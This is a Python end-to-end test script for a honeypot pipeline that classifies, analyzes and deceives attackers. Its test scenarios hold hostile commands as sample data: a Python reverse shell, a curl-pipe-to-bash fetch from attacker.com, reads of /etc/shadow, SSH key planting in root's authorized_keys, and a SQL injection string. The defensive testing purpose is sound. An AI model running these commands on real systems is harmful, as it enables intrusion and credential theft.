#!/usr/bin/env python3
"""RAGIN End-to-End Test — simulates honeypot interaction pipeline."""

import json
import sys
import time
from pathlib import Path

import httpx

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

API_KEY = "ragin-test-key-2024"
BASE_URLS = {
    "chrollo": "http://127.0.0.1:8081",
    "don": "http://127.0.0.1:8082",
    "hisoka": "http://127.0.0.1:8083",
}


def headers():
    return {"X-API-Key": API_KEY, "Content-Type": "application/json"}


# ─── Test Scenarios ──────────────────────────────────────────────────────────

SCENARIOS = {
    "novice_scanner": {
        "name": "Novice — Port Scanner",
        "description": "Script kiddie running nmap/nessus",
        "session": {
            "session_id": "eenovice001",
            "commands": [
                {"timestamp": "2024-01-15T10:00:00Z", "command": "nmap -sV 10.0.0.1", "success": True},
                {"timestamp": "2024-01-15T10:00:05Z", "command": "nikto -h 10.0.0.1", "success": True},
                {"timestamp": "2024-01-15T10:00:10Z", "command": "dirb http://10.0.0.1", "success": False},
            ],
            "duration_seconds": 15,
            "features": {
                "command_count": 3,
                "unique_tools": ["nmap", "nikto", "dirb"],
                "shell_ratio": 0.0,
                "privilege_escalation_attempts": 0,
                "recon_ratio": 1.0,
            },
        },
        "attacker_input": "ls -la /etc/passwd",
    },
    "intermediate_web": {
        "name": "Intermediate — Web Exploiter",
        "description": "Targeted web attack with SQLi/XSS",
        "session": {
            "session_id": "eeintermed002",
            "commands": [
                {
                    "timestamp": "2024-01-15T11:00:00Z",
                    "command": "sqlmap -u 'http://target?id=1' --dbs",
                    "success": True,
                },
                {
                    "timestamp": "2024-01-15T11:00:30Z",
                    "command": "sqlmap -u 'http://target?id=1' -D mysql --tables",
                    "success": True,
                },
                {"timestamp": "2024-01-15T11:01:00Z", "command": "cat /etc/passwd", "success": True},
                {"timestamp": "2024-01-15T11:01:30Z", "command": "curl http://target/admin", "success": False},
            ],
            "duration_seconds": 90,
            "features": {
                "command_count": 4,
                "unique_tools": ["sqlmap", "curl"],
                "shell_ratio": 0.5,
                "privilege_escalation_attempts": 0,
                "recon_ratio": 0.25,
                "exploit_ratio": 0.75,
            },
        },
        "attacker_input": "SELECT * FROM users WHERE id=1 UNION SELECT username,password FROM admins--",
    },
    "expert_apt": {
        "name": "Expert — APT-style",
        "description": "Manual exploitation, lateral movement",
        "session": {
            "session_id": "eeexpert003",
            "commands": [
                {"timestamp": "2024-01-15T12:00:00Z", "command": "whoami", "success": True},
                {"timestamp": "2024-01-15T12:00:01Z", "command": "id", "success": True},
                {"timestamp": "2024-01-15T12:00:02Z", "command": "cat /etc/shadow", "success": False},
                {"timestamp": "2024-01-15T12:00:05Z", "command": "find / -perm -4000 2>/dev/null", "success": True},
                {
                    "timestamp": "2024-01-15T12:00:10Z",
                    "command": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
                    "success": True,
                },
                {
                    "timestamp": "2024-01-15T12:00:15Z",
                    "command": "ssh-keygen -t rsa -f /tmp/id_rsa -N ''",
                    "success": True,
                },
                {
                    "timestamp": "2024-01-15T12:00:20Z",
                    "command": "cp /tmp/id_rsa.pub /root/.ssh/authorized_keys",
                    "success": False,
                },
            ],
            "duration_seconds": 180,
            "features": {
                "command_count": 7,
                "unique_tools": ["python3", "ssh-keygen", "find"],
                "shell_ratio": 1.0,
                "privilege_escalation_attempts": 2,
                "recon_ratio": 0.43,
                "exploit_ratio": 0.57,
                "reverse_shell_detected": True,
            },
        },
        "attacker_input": "python3 -c 'import os; os.system(\"curl http://attacker.com/payload.sh | bash\")'",
    },
}


# ─── Test Runner ──────────────────────────────────────────────────────────────


def run_scenario(scenario_key: str) -> dict:
    """Run a single honeypot scenario through the full pipeline."""
    scenario = SCENARIOS[scenario_key]
    results = {"scenario": scenario["name"], "steps": [], "success": True}

    print(f"\n{'='*60}")
    print(f"Scenario: {scenario['name']}")
    print(f"Description: {scenario['description']}")
    print(f"{'='*60}")

    # Step 1: Health check all services
    print("\n[1/4] Health check...")
    for name, base_url in BASE_URLS.items():
        try:
            resp = httpx.get(f"{base_url}/health", timeout=3.0)
            healthy = resp.status_code == 200
            print(f"  {'✓' if healthy else '✗'} {name}: {resp.json().get('status', 'unknown')}")
            if not healthy:
                results["success"] = False
                results["steps"].append({"step": "health", "service": name, "ok": False})
                return results
        except Exception as e:
            print(f"  ✗ {name}: {e}")
            results["success"] = False
            return results
    results["steps"].append({"step": "health", "ok": True})

    # Step 2: Chrollo classification
    print("\n[2/4] Chrollo — Behavioral Classification...")
    t0 = time.monotonic()
    try:
        resp = httpx.post(
            f"{BASE_URLS['chrollo']}/api/classify",
            headers=headers(),
            json=scenario["session"],
            timeout=10.0,
        )
        chrollo_time = time.monotonic() - t0
        print(f"  Status: {resp.status_code}")
        print(f"  Time: {chrollo_time:.3f}s")
        if resp.status_code == 200:
            chrollo_result = resp.json()
            print(f"  Result: {json.dumps(chrollo_result, indent=2)[:500]}")
            results["steps"].append({"step": "chrollo", "ok": True, "time": chrollo_time, "result": chrollo_result})
        else:
            print(f"  Error: {resp.text[:300]}")
            results["steps"].append({"step": "chrollo", "ok": False, "error": resp.text[:300]})
    except Exception as e:
        print(f"  Exception: {e}")
        results["steps"].append({"step": "chrollo", "ok": False, "error": str(e)})
        chrollo_result = None

    # Step 3: Don — Threat Analysis
    print("\n[3/4] Don — Threat Intelligence Analysis...")
    don_payload = {
        "session_id": scenario["session"]["session_id"],
        "classification": "malicious" if "expert" in scenario_key or "intermediate" in scenario_key else "suspicious",
        "confidence": 0.85,
        "features": scenario["session"]["features"],
    }
    t0 = time.monotonic()
    try:
        resp = httpx.post(
            f"{BASE_URLS['don']}/api/analyze",
            headers=headers(),
            json=don_payload,
            timeout=30.0,
        )
        don_time = time.monotonic() - t0
        print(f"  Status: {resp.status_code}")
        print(f"  Time: {don_time:.3f}s")
        if resp.status_code == 200:
            don_result = resp.json()
            print(f"  Result: {json.dumps(don_result, indent=2)[:500]}")
            results["steps"].append({"step": "don", "ok": True, "time": don_time, "result": don_result})
        else:
            print(f"  Error: {resp.text[:300]}")
            results["steps"].append({"step": "don", "ok": False, "error": resp.text[:300]})
    except Exception as e:
        print(f"  Exception: {e}")
        results["steps"].append({"step": "don", "ok": False, "error": str(e)})

    # Step 4: Hisoka — Deception Response
    print("\n[4/4] Hisoka — Adaptive Deception...")
    hisoka_payload = {
        "session_id": scenario["session"]["session_id"],
        "skill_level": "expert"
        if "expert" in scenario_key
        else ("intermediate" if "intermediate" in scenario_key else "novice"),
        "context": f"Attacker session: {scenario['description']}",
        "attacker_input": scenario["attacker_input"],
    }
    t0 = time.monotonic()
    try:
        resp = httpx.post(
            f"{BASE_URLS['hisoka']}/api/deceive",
            headers=headers(),
            json=hisoka_payload,
            timeout=30.0,
        )
        hisoka_time = time.monotonic() - t0
        print(f"  Status: {resp.status_code}")
        print(f"  Time: {hisoka_time:.3f}s")
        if resp.status_code == 200:
            hisoka_result = resp.json()
            print(f"  Response: {hisoka_result.get('response_text', hisoka_result.get('response', ''))[:300]}")
            results["steps"].append({"step": "hisoka", "ok": True, "time": hisoka_time, "result": hisoka_result})
        else:
            print(f"  Error: {resp.text[:300]}")
            results["steps"].append({"step": "hisoka", "ok": False, "error": resp.text[:300]})
    except Exception as e:
        print(f"  Exception: {e}")
        results["steps"].append({"step": "hisoka", "ok": False, "error": str(e)})

    return results


def main():
    import argparse

    parser = argparse.ArgumentParser(description="RAGIN E2E Test")
    parser.add_argument(
        "--scenario", "-s", choices=list(SCENARIOS.keys()) + ["all"], default="all", help="Scenario to test"
    )
    parser.add_argument("--output", "-o", help="Save results to JSON file")
    args = parser.parse_args()

    if args.scenario == "all":
        scenarios_to_test = list(SCENARIOS.keys())
    else:
        scenarios_to_test = [args.scenario]

    all_results = []
    passed = 0
    failed = 0

    for key in scenarios_to_test:
        result = run_scenario(key)
        all_results.append(result)
        if result["success"]:
            passed += 1
        else:
            failed += 1

    # Summary
    print(f"\n{'='*60}")
    print("TEST SUMMARY")
    print(f"{'='*60}")
    for r in all_results:
        status = "✓ PASS" if r["success"] else "✗ FAIL"
        print(f"  {status} — {r['scenario']}")
    print(f"\nTotal: {passed} passed, {failed} failed")

    if args.output:
        out_path = Path(args.output)
        out_path.write_text(json.dumps(all_results, indent=2, default=str))
        print(f"Results saved to: {out_path}")

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
